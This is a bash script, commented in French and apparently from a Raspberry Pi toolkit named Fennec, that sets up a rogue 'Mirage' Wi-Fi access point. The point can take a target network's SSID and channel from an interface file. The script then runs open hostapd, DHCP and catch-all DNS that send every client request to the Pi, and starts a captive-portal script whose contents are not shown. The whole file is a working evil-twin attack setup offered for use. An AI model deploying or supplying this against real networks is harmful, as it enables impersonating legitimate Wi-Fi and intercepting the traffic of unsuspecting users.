#!/usr/bin/env bash
# Lève le faux AP Mirage (hostapd + dnsmasq) sur wlan1.
# AP ouvert + DHCP + DNS catch-all : toute requête du client est renvoyée vers le Pi.
# Usage: fennec-mirage-ap "SSID" CANAL
set -euo pipefail

IFACE=wlan1
AP_IP=10.0.0.1
RUN=/tmp/fennec-mirage
TARGET=/tmp/fennec-mirage-target   # ecrit par Fennec : ligne 1 = SSID, ligne 2 = canal

mkdir -p "$RUN"

# SSID et canal : argument explicite, sinon cible choisie dans l'interface,
# sinon valeur de test par defaut.
SSID="${1:-}"
CANAL="${2:-}"
if [ -z "$SSID" ] && [ -f "$TARGET" ]; then
  SSID="$(sed -n '1p' "$TARGET")"
  [ -z "$CANAL" ] && CANAL="$(sed -n '2p' "$TARGET")"
fi
SSID="${SSID:-Fennec-test}"
CANAL="${CANAL:-1}"

nmcli dev set "$IFACE" managed no 2>/dev/null || true
ip addr flush dev "$IFACE" 2>/dev/null || true
ip addr add "$AP_IP/24" dev "$IFACE"
ip link set "$IFACE" up

cat > "$RUN/hostapd.conf" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CANAL
EOF

cat > "$RUN/dnsmasq.conf" <<EOF
interface=$IFACE
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
EOF

pkill -f "$RUN/dnsmasq.conf" 2>/dev/null || true
pkill -f fennec-mirage-portal 2>/dev/null || true
sleep 1

# DHCP + DNS catch-all
dnsmasq -C "$RUN/dnsmasq.conf"

# Portail captif (sert /opt/fennec-mirage/portal et declenche la detection)
mkdir -p /opt/fennec-mirage/portal
python3 /usr/local/bin/fennec-mirage-portal &

exec hostapd "$RUN/hostapd.conf"
